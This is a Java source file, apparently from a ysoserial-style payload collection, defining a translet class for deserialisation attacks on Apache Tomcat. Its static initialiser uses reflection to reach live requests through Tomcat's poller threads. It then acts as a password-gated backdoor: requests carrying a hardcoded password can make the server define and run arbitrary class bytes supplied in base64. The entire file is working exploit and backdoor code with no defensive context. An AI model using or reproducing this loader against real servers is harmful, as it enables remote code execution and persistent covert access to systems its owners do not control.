package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class TomcatTmplClassLoader extends AbstractTranslet {
    static {
        Object obj = Thread.currentThread();
        Field field;
        try {
            field = obj.getClass().getSuperclass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Thread[] threads = (Thread[]) obj;
        label:
        for (Thread thread : threads) {
            try {
                if ((thread.getName().contains("http-apr") && thread.getName().contains("Poller"))
                    || (thread.getName().contains("http-bio") && thread.getName().contains("AsyncTimeout"))
                    || (thread.getName().contains("http-nio") && thread.getName().contains("Poller"))) {
                    field = thread.getClass().getDeclaredField("target");
                    field.setAccessible(true);
                    obj = field.get(thread);
                    field = obj.getClass().getDeclaredField("this$0");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    try {
                        field = obj.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    field.setAccessible(true);
                    obj = field.get(obj);
                    try {
                        field = obj.getClass().getSuperclass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        field = obj.getClass().getDeclaredField("global");
                    }
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getDeclaredField("processors");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    java.util.List processors = (java.util.List) obj;
                    for (Object o : processors) {
                        field = o.getClass().getDeclaredField("req");
                        field.setAccessible(true);
                        obj = field.get(o);
                        org.apache.coyote.Request req = (org.apache.coyote.Request) obj;
                        String pwd = req.getParameters().getParameter("pwd");
                        System.out.println("pwd: " + pwd);//
                        String type = req.getParameters().getParameter("type");
                        if (pwd != null && pwd.equals("popko_pwd") && type != null) {
                            try {
                                Class clazz = Class.forName(type);
                                System.out.println("has " + type);
                                clazz.newInstance().equals(req);//Echo
                            } catch (ClassNotFoundException e) {
                                System.out.println("no " + type);
                                String ver = System.getProperty("java.version");
                                System.out.println(ver);//
                                //if (ver.startsWith("1.8")) {
                                String code1 = req.getParameters().getParameter("code");
                                if (code1 != null) {
                                    byte[] code = java.util.Base64.getDecoder().decode(code1);
//                        new U(this.getClass().getClassLoader()).g(bytes).newInstance();
                                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                                    defineClass.setAccessible(true);
                                    //Class clazz = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), type, code, 0, code.length);
                                    Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), type, code, 0, code.length);
                                    clazz.newInstance().equals(req);//Echo
                                }//1.8.0_201
                            }
                            break label;
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
